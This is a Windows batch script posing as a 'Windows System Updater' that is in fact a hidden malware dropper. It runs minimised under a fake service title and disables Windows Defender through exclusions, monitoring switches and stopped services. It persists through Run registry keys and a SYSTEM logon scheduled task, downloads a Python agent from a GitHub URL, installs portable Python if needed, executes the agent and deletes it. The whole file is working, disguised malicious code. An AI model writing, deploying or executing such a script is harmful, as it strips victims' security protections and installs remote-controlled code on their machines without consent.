@echo off
:: Windows System Updater v3.0
:: No output, no console, runs completely hidden

if "%1"=="--hidden" goto :hidden
start /min "" "%~f0" --hidden
exit

:hidden
mode con: cols=0 lines=0
title Windows System Service

:: Add self to Windows Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath \"%~f0\" -ErrorAction SilentlyContinue" 2>nul
powershell -Command "Add-MpPreference -ExclusionPath \"%temp%\" -ErrorAction SilentlyContinue" 2>nul
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue" 2>nul
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue" 2>nul

:: Stop Windows Defender services
net stop WinDefend 2>nul
net stop SecurityHealthService 2>nul
sc config WinDefend start= disabled 2>nul

:: Add to registry startup (SYSUPDATER)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SYSUPDATER" /t REG_SZ /d "\"%~f0\"" /f 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SYSUPDATER" /t REG_SZ /d "\"%~f0\"" /f 2>nul

:: Create scheduled task
schtasks /create /tn "SYSUPDATER" /tr "\"%~f0\"" /sc onlogon /f /ru "SYSTEM" /rl HIGHEST 2>nul

:: Download agent from GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
set "AGENT_FILE=%temp%\sysupdater_%random%.py"

powershell -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%AGENT_FILE%' -UseBasicParsing" 2>nul

:: Run agent with Python
python "%AGENT_FILE%" 2>nul

:: If Python not found, install portable Python silently
if %errorlevel% neq 0 (
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-embed-amd64.zip' -OutFile '%temp%\python.zip' -UseBasicParsing" 2>nul
    powershell -Command "Expand-Archive -Path '%temp%\python.zip' -DestinationPath '%temp%\python'" 2>nul
    copy "%AGENT_FILE%" "%temp%\python\agent.py" 2>nul
    "%temp%\python\python.exe" "%temp%\python\agent.py" 2>nul
)

:: Cleanup
timeout /t 5 /nobreak >nul
del "%AGENT_FILE%" 2>nul
exit
